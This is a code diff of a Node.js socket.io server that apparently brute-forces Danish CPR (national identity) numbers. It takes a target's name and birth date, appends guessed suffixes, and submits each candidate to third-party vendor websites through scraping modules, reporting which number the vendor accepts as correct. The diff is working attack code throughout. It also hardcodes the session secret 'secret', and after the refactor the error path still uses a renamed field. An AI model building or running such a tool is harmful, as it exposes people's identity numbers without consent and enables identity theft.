@@ -8,6 +8,7 @@ var kutils = require("./utils/konUtils.js"),
 	$ = require("jquery"),	  
 	querystring = require("querystring"),
 	Step = require("step"),		
+	vendorSpecific = require("./vendors/Dummy.js"),
 	
 	// Session handling
   MemoryStore = express.session.MemoryStore,    
@@ -15,22 +16,21 @@ var kutils = require("./utils/konUtils.js"),
   Session = require('connect').middleware.session.Session,
 	parseCookie = require('connect').utils.parseCookie;     
 	
-
-// disable socket.io logging
+// prepare session (cookie) handling
+app.configure(function () {
+	app.use(express.cookieParser());
+	app.use(express.session({store: sessionStore, secret: 'secret', key: 'express.sid'}));
+});	
+	
+// start webserver and sockets
+app.listen(3000);
 var sio = io.listen(app);
 sio.set('log level', 1); 
 
 
 /*
- * Session settings
- ******************************************/
-
-/*
  * Web server routing
  ******************************************/
-
-// start webserver
-app.listen(3000);
 
 // pass arguments
 app.use(express.bodyParser());
@@ -60,12 +60,6 @@ app.get('/', function(req, res){
   res.sendfile(__dirname + '/pages/index.html');
 });
 
-// prepare session (cookie) handling
-app.configure(function () {
-	app.use(express.cookieParser());
-	app.use(express.session({store: sessionStore, secret: 'secret', key: 'express.sid'}));
-});
-
 
 /*
  * Sockets
@@ -74,6 +68,7 @@ app.configure(function () {
 // authentication
 sio.sockets.on('connection', function (socket) {
 
+	// auth - happens on every client reload
 	sio.set('authorization', function (data, callback) {
 	  if (data.headers.cookie) {
 	  
@@ -104,65 +99,80 @@ sio.sockets.on('connection', function (socket) {
 		// accept the incoming connection
 		callback(null, true);
 	});
-
 });
 
-
-// run for every new client reload
+// get socket connection
 sio.sockets.on('connection', function (socket) {
 
-	// data from client
-	var inputData = {};
-
-	// receive inputs (name and birthday)
-  socket.on('setInputData', function (data) {
-	  socket.emit('msg', 'Received data ' + JSON.stringify(data));
-  	req.session.name = data.firstName;	  
-		for(var key in data){
-		  inputData[key] = data[key];
-	  }
-
-	  // Debuggin' ONLY: overwrite cpr numbers
-	  //inputData["cprNumbers"] = new Array('1337', '1232', '1231');
- 
- 		// open handshake session
- 		var currentSession = socket.handshake.session;
- 		
- 		if(currentSession.vendorBase == undefined){
- 			// includes
-			var vendorBase = require("./vendorBase.js"),	
-					vendorSpecific = require("./vendors/Callme.js");
+	// receive basic data from client. only happens on first request
+	socket.on('setBasicData', function (basicData) {
+		var hs = socket.handshake;
+		
+		if(hs == undefined || hs.session == undefined){
+		  socket.emit('error', 'reload');
+			console.log("Error #1: hs is undefined!");
+			return;
+		}
+	
+		if(hs.session.vendor == undefined){
+			hs.session.vendor = {};
+			var vendorBase = require("./vendorBase.js");
 			
-			// merge specific vendor and base
-			$.extend(vendorBase.options, vendorSpecific.options);
-			$.extend(vendorBase.data, vendorSpecific.data);
-			$.extend(vendorBase.settings, vendorSpecific.settings);
-			vendorBase.getResponse = vendorSpecific.getResponse;	  
+			// merge base with new session object
+			$.extend(hs.session.vendor, vendorBase);
+			
+			// merge specific vendor and new session object
+			$.extend(hs.session.vendor.options, vendorSpecific.options);
+			$.extend(hs.session.vendor.data, vendorSpecific.data);
+			$.extend(hs.session.vendor.settings, vendorSpecific.settings);
+			hs.session.vendor.getResponse = vendorSpecific.getResponse;	  
 				
-			// update placeholder for name
-			vendorBase.updatePlaceholders({
-				firstName: inputData.firstName,
-				lastName: inputData.lastName
+			// set first- and last name according to filters
+			hs.session.vendor.updatePlaceholders({
+				firstName: basicData.firstName,
+				lastName: basicData.lastName
 			}, "name");
-					
-			// get vendor session cookie (not handshake session!!)
-			if(typeof vendorSpecific.prepareRequest === 'function') {	  
-				vendorSpecific.prepareRequest(function(cookie){	  
-					vendorBase.options.cookie = cookie;
-					init(inputData, socket, vendorBase);
-				});
-			}else{
-				init(inputData, socket, vendorBase);		
-			} 
 			
+			// set dob
+			hs.session.vendor.dob = basicData.dob;
+						
 			// add to session and save
-			currentSession.vendorBase.push(vendorBase);
-			currentSession.save();
-		}else{
-			var vendorBase = currentSession.vendorBase;
-		}		
-  });
+			hs.session.save();
+			console.log(hs.session.vendor);			
+		}
+				
+		// get vendor session cookie (not handshake session!!)
+		if(typeof vendorSpecific.prepareRequest === 'function') {	  
+			vendorSpecific.prepareRequest(function(cookie){	  
+				hs.session.vendor.options.cookie = cookie;
+			});
+		}
+	});
+	
+	// set cpr number - happens on every request from client
+	socket.on('setCprNumber', function (cprNumber) {
+
+		var hs = socket.handshake;
+		
+		if(hs == undefined || hs.session == undefined){
+		  socket.emit('error', 'reload');		
+			console.log("Error #2: hs is undefined!");
+			return;
+		}
+		
+		var vendorObj = {};
+		Step(function step1(){
+			return $.extend(true, vendorObj, hs.session.vendor);
+		},function step2(){
+			// set original cpr number (not formatted)
+			var originalCprNumber = vendorObj.dob + "" + cprNumber;				
+			return vendorObj.settings.originalCprNumber = originalCprNumber;	
+		}, function asda(){
+			init(socket, vendorObj);
+		})	
+	});			
 });
+
 
 
 
@@ -170,64 +180,55 @@ sio.sockets.on('connection', function (socket) {
  * Start brute forcing
  ******************************************/
 
-function init(inputData, socket, vendorBase){
-	// iterate cpr numbers
-	var cprNumbersTotal=inputData.cprNumbers.length;	
-	for(var i=0; i<cprNumbersTotal; i++) {
-	
-		var vendorObj = $.extend(true, {}, vendorBase);
-	
-		// queueing requests
-	  socket.emit('queueing');
-
+function init(socket, vendorObj){
+				
 		// update placeholders for cpr number
-		var realCprNumber = inputData.dob + "" + inputData.cprNumbers[i];	
-		vendorObj.updatePlaceholders(realCprNumber, "cpr");
+		vendorObj.updatePlaceholders(vendorObj.settings.originalCprNumber, "cpr");
+
+		console.log("Init for " + vendorObj.settings.originalCprNumber);
+	// queueing requests
+  socket.emit('queueing');
+
+	Step(
+		// send request
+		function step1(){
+			console.log("Timeout 1");
+			var req = {
+				options: vendorObj.options,
+				data: vendorObj.data,
+				settings: vendorObj.settings
+			};
+			Curl.scrape(req, this);	
+		},
 		
-		// set original cpr number (not formatted)
-		vendorObj.settings.realCprNumber = realCprNumber;
-
-		Step(
-			// send request
-			function step1(){
-				console.log("Timeout 1");
-				var req = {
-					options: vendorObj.options,
-					data: vendorObj.data,
-					settings: vendorObj.settings
-				};
-				Curl.scrape(req, this);	
-			},
-			
-			// get response from vendor and parse to vendorparser
-			function step2(req, res){	
-				console.log("Timeout 2");
-									
-				// connection error
-				if(res.error !== undefined ){
-					socket.emit('failed', req.settings.realCprNumber);						
-					kutils.debug("Adding to retry", req.settings.realCprNumber, 1, "step2")
-					console.log(res.error);
-				// no connection errors
-				}else{
-					vendorObj.getResponse(req, res, this);
-				}
-			},
-			
-			// check response
-			function step3(cpr, status){
-				console.log("Timeout 3" + cpr);
-			
-				if(status == "success"){
-					socket.emit('correctCPR', cpr);
-					kutils.debug("Correct CPR", cpr, 2, "getResponse");
-				}else{					
-					socket.emit('incorrectCPR', cpr, status);
-					//kutils.debug("Incorrect CPR", cpr + ' - ' + JSON.stringify(status), 2, "getResponse");
-				}
-
-				socket.emit('completed');
+		// get response from vendor and parse to vendorparser
+		function step2(req, res){	
+			console.log("Timeout 2");
+								
+			// connection error
+			if(res.error !== undefined ){
+				socket.emit('failed', req.settings.realCprNumber);						
+				kutils.debug("Adding to retry", req.settings.realCprNumber, 1, "step2")
+				console.log(res.error);
+			// no connection errors
+			}else{
+				vendorObj.getResponse(req, res, this);
 			}
-		); // end step
-	}	// end for loop
+		},
+		
+		// check response
+		function step3(cpr, status){
+			console.log("Timeout 3" + cpr);
+		
+			if(status == "success"){
+				socket.emit('correctCPR', cpr);
+				kutils.debug("Correct CPR", cpr, 2, "getResponse");
+			}else{					
+				socket.emit('incorrectCPR', cpr, status);
+				//kutils.debug("Incorrect CPR", cpr + ' - ' + JSON.stringify(status), 2, "getResponse");
+			}
+
+			socket.emit('completed');
+		}
+	); // end step
 }
